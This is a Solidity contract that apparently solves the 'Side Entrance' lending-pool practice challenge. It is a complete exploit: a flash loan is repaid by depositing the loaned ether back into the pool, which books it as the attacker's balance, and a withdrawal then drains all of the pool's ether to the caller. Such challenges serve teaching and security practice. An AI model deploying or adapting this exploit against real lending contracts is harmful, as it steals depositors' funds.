// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256) external;
}

contract Attacker4 {
    ISideEntranceLenderPool public immutable pool;

    constructor(address _pool) {
        pool = ISideEntranceLenderPool(_pool);
    }

    function attack() external {
        uint256 amount = address(pool).balance;
        pool.flashLoan(amount);
        pool.withdraw();
        payable(msg.sender).call{value: amount}("");
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
